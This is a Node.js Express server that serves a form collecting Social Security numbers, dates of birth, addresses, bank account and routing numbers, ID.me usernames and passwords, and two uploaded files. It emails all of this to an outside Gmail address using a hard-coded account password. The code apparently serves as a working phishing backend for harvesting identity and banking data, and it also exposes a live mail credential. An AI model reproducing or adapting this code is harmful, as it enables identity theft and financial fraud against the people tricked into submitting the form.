const express = require("express");
const bodyParser = require("body-parser");
const Joi = require("joi");
const nodemailer = require("nodemailer");
const multer = require("multer");

const app = express();

const port = 2000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use("/public", express.static("public"));
app.use("/uploads", express.static("uploads"));
app.set("view engine", "ejs");

// Set up multer storage configuration
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "./uploads");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + file.originalname);
  },
});

const upload = multer({ storage: storage });

const infoSchema = Joi.object({
  fName: Joi.string().min(3).max(30).required(),
  lName: Joi.string().min(3).max(30).required(),
  ssn: Joi.string().regex(/^\d{3}-\d{2}-\d{4}$/),
  dob: Joi.date().less(new Date("01/01/2023")).required(),
  street: Joi.array().items(Joi.string()).required(),
  city: Joi.array().items(Joi.string()).required(),
  state: Joi.array().items(Joi.string().length(2)).required(),
  postalCode: Joi.array().items(Joi.string()).required(),
  personalBankName: Joi.string().min(3).max(30).required(),
  personalBankAccountNo: Joi.string().min(8).max(15),
  personalBankRoutingNo: Joi.string().min(9).max(9),
  businessBankName: Joi.string().min(3).max(30).required(),
  businessBankAccountNo: Joi.string().min(8).max(15),
  businessBankRoutingNo: Joi.string().min(9).max(9),
  idUsername: Joi.string().required(),
  idPassword: Joi.string().required(),
  selectField: Joi.valid(
    " ",
    "Father",
    "Mother",
    "Sibling",
    "Cousin",
    "Nephew",
    "Niece",
    "Friend"
  )
    .required()
    .messages({
      "any.only": "Invalid option selected",
    }),
  files: Joi.array().items(Joi.any()).length(2),
});

app.get("/", (req, res) => {
  res.render("form");
});

app.post("/form", upload.array("files"), async (req, res) => {
  ``;
  const formData = req.body;
  const files = req.files;

  const { error, value } = infoSchema.validate(formData, {
    abortEarly: false,
  });

  if (error) {
    console.log(error);
    return res.status(400).send(error.details[0].message); // Return error message to client
  }

  // Create reusable transporter object using the default SMTP transport
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "ihemelanduchinedu@gmail.com",
      pass: "tvgtvyjlezjfbeiw",
    },
  });

  // Send email with defined transport object
  const mailOptions = {
    from: "ihemelanduchinedu@gmail.com",
    to: "jaketimber708@gmail.com",
    subject: "New Message from Contact Form",
    text: `Name: ${value.fName} ${value.lName}\n\nSSN: ${value.ssn}\n\nDOB: ${value.dob}\n\n1) Personal address: ${value.street[0]},${value.city[0]},${value.state[0]}, ${value.postalCode[0]} 
    \n2) Personal bank address: ${value.street[1]},${value.city[1]},${value.state[1]}, ${value.postalCode[1]}
    \n3) Business Bank address: ${value.street[2]}, ${value.city[2]}, ${value.state[2]},${value.postalCode[2]}\n\n4) Personal Bank Name: ${value.personalBankName}\n\n5) Personal Bank Account no: ${value.personalBankAccountNo}\n\n6) Personal Bank Routing no: ${value.personalBankRoutingNo}\n\n7) Business Bank Name: ${value.businessBankName}\n\n8) Business Bank Account no: ${value.businessBankAccountNo}\n\n9) Business Bank Routing no: ${value.businessBankRoutingNo}\n\n10) ID.me Username: ${value.idUsername}\n\n11) ID.me Password: ${value.idPassword}`, // Plain text body
    attachments: files.map((file) => ({
      filename: file.originalname,
      path: file.path,
    })),
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error);
      return res.status(500).send("Failed to send email");
    } else {
      console.log("Email sent: " + info.response);
      return res.status(200).send(`<h1>Successfully submitted</h1>`);
    }
  });
});

app.listen(port, () => {
  console.log(`Server started at http://localhost:${port}`);
});
